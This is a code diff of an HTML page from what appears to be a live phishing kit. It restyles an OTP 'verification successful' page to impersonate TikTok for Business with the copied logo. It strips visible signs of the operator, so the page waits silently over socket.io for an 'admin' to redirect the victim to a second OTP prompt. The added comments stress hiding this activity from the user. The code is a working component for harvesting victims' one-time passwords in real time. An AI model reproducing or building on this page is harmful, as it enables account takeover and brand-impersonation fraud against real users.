@@ -2,126 +2,281 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Success - OTP Verified</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>TikTok for Business - Verification</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            background: #000000;
+        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            background: #0a0a0a;
             padding: 16px;
+            background: #000000;
         }
-        .success-container {
-            text-align: center;
+
+        /* Main container - TikTok dark theme */
+        .container {
             background: #121212;
-            padding: 40px 32px;
+            padding: 36px 24px;
             border-radius: 32px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
-            border: 1px solid #2a2a2a;
-            color: white;
-            max-width: 380px;
             width: 100%;
+            max-width: 400px;
+            margin: auto;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
         }
-        .checkmark {
-            font-size: 70px;
-            color: #4CAF50;
+
+        /* TikTok Logo */
+        .tiktok-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .tiktok-logo svg {
+            width: 80px;
+            height: 80px;
+        }
+
+        /* Success Icon - TikTok style check */
+        .success-icon {
+            text-align: center;
             margin-bottom: 20px;
         }
+
+        .success-icon svg {
+            width: 70px;
+            height: 70px;
+            filter: drop-shadow(0 4px 10px rgba(254, 44, 85, 0.3));
+        }
+
+        /* Main title */
         h2 {
-            margin-bottom: 10px;
-            font-size: 24px;
+            color: white;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
         }
-        p {
+
+        /* Subtitle */
+        .subtitle {
             color: #aaa;
-            margin-bottom: 20px;
+            text-align: center;
             font-size: 15px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            padding: 0 10px;
         }
-        .email {
+
+        /* Email display - TikTok pink */
+        .email-box {
+            background: #1a1a1a;
+            padding: 16px;
+            border-radius: 40px;
+            margin-bottom: 30px;
+            border: 1px solid #2a2a2a;
+            text-align: center;
+        }
+
+        .email-label {
+            color: #888;
+            font-size: 13px;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .email-value {
+            color: #fe2c55;
+            font-weight: 600;
+            font-size: 16px;
+            word-break: break-all;
+        }
+
+        /* Loading Section - TikTok style */
+        .loading-section {
+            background: #1a1a1a;
+            padding: 24px;
+            border-radius: 40px;
+            border: 1px solid #2a2a2a;
+            margin-bottom: 20px;
+        }
+
+        /* TikTok Spinner */
+        .tiktok-spinner {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .spinner-dot {
+            width: 12px;
+            height: 12px;
+            background: #fe2c55;
+            border-radius: 50%;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        .spinner-dot:nth-child(2) {
+            background: #00f2ea;
+            animation-delay: 0.2s;
+        }
+
+        .spinner-dot:nth-child(3) {
+            background: #fe2c55;
+            animation-delay: 0.4s;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 0.5;
+            }
+            50% {
+                transform: scale(1.3);
+                opacity: 1;
+            }
+        }
+
+        /* Loading text */
+        .loading-text {
+            color: white;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .loading-subtext {
+            color: #888;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        /* TikTok Music Note Animation */
+        .music-notes {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0 10px;
+            opacity: 0.6;
+        }
+
+        .note {
+            color: #fe2c55;
+            font-size: 20px;
+            animation: float 2s ease-in-out infinite;
+        }
+
+        .note:nth-child(2) {
+            color: #00f2ea;
+            animation-delay: 0.3s;
+        }
+
+        .note:nth-child(3) {
+            color: #ffffff;
+            animation-delay: 0.6s;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        /* Footer text - TikTok style */
+        .footer-text {
+            text-align: center;
+            color: #555;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+
+        .footer-text span {
             color: #fe2c55;
             font-weight: 500;
-            margin: 10px 0;
-            padding: 12px;
-            background: #1a1a1a;
-            border-radius: 40px;
-            word-break: break-all;
-            border: 1px solid #2a2a2a;
-            font-size: 14px;
         }
-        .waiting-message {
-            background: #1a1a1a;
-            padding: 18px;
-            border-radius: 40px;
-            margin-top: 20px;
-            border: 1px solid #2a2a2a;
-        }
-        .waiting-message .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #fe2c55;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-right: 10px;
-            vertical-align: middle;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .toast {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #2196F3;
-            color: white;
-            padding: 15px 20px;
-            border-radius: 40px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+
+        /* Hidden toast (keep for functionality but invisible to user) */
+        .hidden-toast {
             display: none;
-            animation: slideIn 0.3s ease;
-            z-index: 1000;
-            font-size: 14px;
-        }
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        .connection-status {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #666;
-        }
-        .connection-status.connected {
-            color: #4CAF50;
-        }
-        .connection-status.disconnected {
-            color: #f44336;
         }
     </style>
 </head>
 <body>
-    <div class="success-container">
-        <div class="checkmark">✓</div>
-        <h2>OTP Verified Successfully!</h2>
-        <p>Your first OTP has been verified.</p>
-        <div class="email" id="emailDisplay"></div>
-        
-        <div class="waiting-message">
-            <span class="spinner"></span>
-            <span>Waiting for admin to request second OTP...</span>
+    <div class="container">
+        <!-- TikTok Logo -->
+        <div class="tiktok-logo">
+            <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M38.306 15.768C36.3 14.536 34.67 12.762 33.652 10.7C32.774 8.92 32.302 6.97 32.28 5H24.564V28.806C24.542 30.216 23.944 31.546 22.932 32.51C21.92 33.474 20.568 33.996 19.158 33.974C17.748 33.952 16.418 33.354 15.454 32.342C14.49 31.33 13.968 29.978 13.99 28.568C14.034 25.704 16.382 23.4 19.246 23.4C19.88 23.4 20.492 23.526 21.06 23.744V16.026C20.446 15.914 19.832 15.858 19.204 15.858C14.898 15.858 11.124 18.536 9.74 22.49C8.356 26.444 9.256 30.766 12.096 33.816C14.158 36.024 17.014 37.296 20.028 37.296C26.284 37.296 31.38 32.2 31.38 25.944V15.28C32.954 16.412 34.724 17.246 36.588 17.734C37.488 17.978 38.388 18.136 39.288 18.228V14.17C38.944 14.114 38.606 14.034 38.306 13.942V15.768Z" fill="white"/>
+                <path d="M38.306 15.768V13.942C37.206 13.592 36.188 13.05 35.282 12.346C34.21 13.58 32.934 14.634 31.5 15.458C29.912 16.374 28.178 16.998 26.378 17.298C25.71 17.416 25.036 17.48 24.358 17.48V25.198C24.358 27.614 23.402 29.894 21.66 31.556C20.078 33.062 17.94 33.916 15.676 33.974C14.262 33.996 12.902 33.578 11.756 32.826C11.112 33.828 10.656 34.934 10.406 36.094C11.75 37.638 13.516 38.782 15.51 39.392C17.504 40.002 19.626 40.044 21.64 39.514C25.226 38.582 28.252 36.134 29.984 32.95C31.214 30.682 31.83 28.148 31.78 25.588V14.78C33.242 15.852 34.894 16.642 36.652 17.1C37.842 17.406 39.064 17.582 40.288 17.634V13.576C39.64 13.476 39.004 13.316 38.386 13.1L38.306 15.768Z" fill="#FE2C55"/>
+                <path d="M10.406 36.094C10.656 34.934 11.112 33.828 11.756 32.826C10.41 31.388 9.488 29.622 9.072 27.712C8.616 29.6 8.748 31.588 9.45 33.4C10.152 35.212 11.384 36.758 13 37.86C12.438 37.278 11.962 36.624 11.588 35.918C11.19 36.324 10.836 36.77 10.532 37.246C10.49 36.862 10.44 36.478 10.406 36.094Z" fill="#25F4EE"/>
+            </svg>
         </div>
-        <div id="connectionStatus" class="connection-status">Connecting to server...</div>
+
+        <!-- Success Icon -->
+        <div class="success-icon">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="12" cy="12" r="10" stroke="#4CAF50" stroke-width="2" fill="none"/>
+                <path d="M8 12L11 15L16 9" stroke="#4CAF50" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+        </div>
+
+        <h2>Verification Successful</h2>
+        <div class="subtitle">Your first OTP has been verified</div>
+
+        <!-- Email Display -->
+        <div class="email-box">
+            <div class="email-label">ACCOUNT</div>
+            <div class="email-value" id="emailDisplay"></div>
+        </div>
+
+        <!-- Loading Section - TikTok Style -->
+        <div class="loading-section">
+            <div class="tiktok-spinner">
+                <div class="spinner-dot"></div>
+                <div class="spinner-dot"></div>
+                <div class="spinner-dot"></div>
+            </div>
+            
+            <div class="loading-text">Please wait as we validate your details</div>
+            <div class="loading-subtext">This will just take a moment</div>
+
+            <!-- TikTok Music Notes Animation -->
+            <div class="music-notes">
+                <span class="note">♪</span>
+                <span class="note">♫</span>
+                <span class="note">♩</span>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer-text">
+            <span>TikTok</span> for Business
+        </div>
     </div>
 
-    <div id="toast" class="toast"></div>
+    <!-- Hidden toast (kept for functionality) -->
+    <div id="toast" class="hidden-toast"></div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -129,100 +284,32 @@
         const urlParams = new URLSearchParams(window.location.search);
         const email = urlParams.get('email');
         
-        console.log('✅ Success page loaded for email:', email);
-        console.log('✅ Full URL:', window.location.href);
+        console.log('✅ Page loaded for:', email);
         
         if (email) {
             document.getElementById('emailDisplay').textContent = email;
-        } else {
-            document.getElementById('emailDisplay').textContent = 'No email provided';
         }
-
-        const statusEl = document.getElementById('connectionStatus');
 
         // Connect to socket.io
-        console.log('🔄 Connecting to socket.io...');
         const socket = io();
 
-        // Connection established
+        // Connection established - silently
         socket.on('connect', () => {
-            console.log('✅ Socket connected successfully! ID:', socket.id);
-            statusEl.textContent = '✅ Connected to server';
-            statusEl.className = 'connection-status connected';
-            showToast('Connected to server');
-            
+            console.log('Connected to server');
             // Identify this user to the server
             socket.emit('identify', { email: email });
-            console.log('📤 Sent identify event for email:', email);
         });
-
-        // Connection error
-        socket.on('connect_error', (error) => {
-            console.error('❌ Socket connection error:', error);
-            statusEl.textContent = '❌ Connection error - retrying...';
-            statusEl.className = 'connection-status disconnected';
-        });
-
-        // Reconnection attempts
-        socket.on('reconnecting', (attempt) => {
-            console.log('🔄 Reconnecting attempt:', attempt);
-            statusEl.textContent = `🔄 Reconnecting (attempt ${attempt})...`;
-        });
-
-        socket.on('reconnect', () => {
-            console.log('✅ Reconnected successfully');
-            statusEl.textContent = '✅ Reconnected to server';
-            statusEl.className = 'connection-status connected';
-            // Re-identify after reconnection
-            socket.emit('identify', { email: email });
-        });
-
-        // Show toast notification
-        function showToast(message) {
-            const toast = document.getElementById('toast');
-            toast.textContent = message;
-            toast.style.display = 'block';
-            
-            setTimeout(() => {
-                toast.style.display = 'none';
-            }, 3000);
-        }
 
         // Listen for redirect event from admin
         socket.on('redirect-to-second-otp', (data) => {
-            console.log('📢 RECEIVED REDIRECT EVENT:', data);
-            console.log('📢 Current email:', email);
-            console.log('📢 Event email:', data.email);
-            
             if (data.email === email) {
-                console.log('✅ Email matches! Redirecting to:', data.redirectUrl);
-                showToast('📱 Admin requested second OTP! Redirecting...');
-                
-                // Update status
-                statusEl.textContent = '🔄 Redirecting to second OTP page...';
-                
-                // Redirect to otp.html with type=second parameter
-                setTimeout(() => {
-                    window.location.href = data.redirectUrl;
-                }, 1500);
-            } else {
-                console.log('❌ Email mismatch - ignoring redirect');
+                console.log('Redirecting to second OTP...');
+                // Silently redirect
+                window.location.href = data.redirectUrl;
             }
         });
 
-        // Listen for test notifications
-        socket.on('test-notification', (data) => {
-            console.log('Test notification received:', data);
-        });
-
-        // Handle disconnection
-        socket.on('disconnect', (reason) => {
-            console.log('🔌 Socket disconnected:', reason);
-            statusEl.textContent = '🔌 Disconnected from server';
-            statusEl.className = 'connection-status disconnected';
-        });
-
-        console.log('✅ Success page ready, waiting for admin to request second OTP...');
+        console.log('✅ Ready');
     </script>
 </body>
 </html>
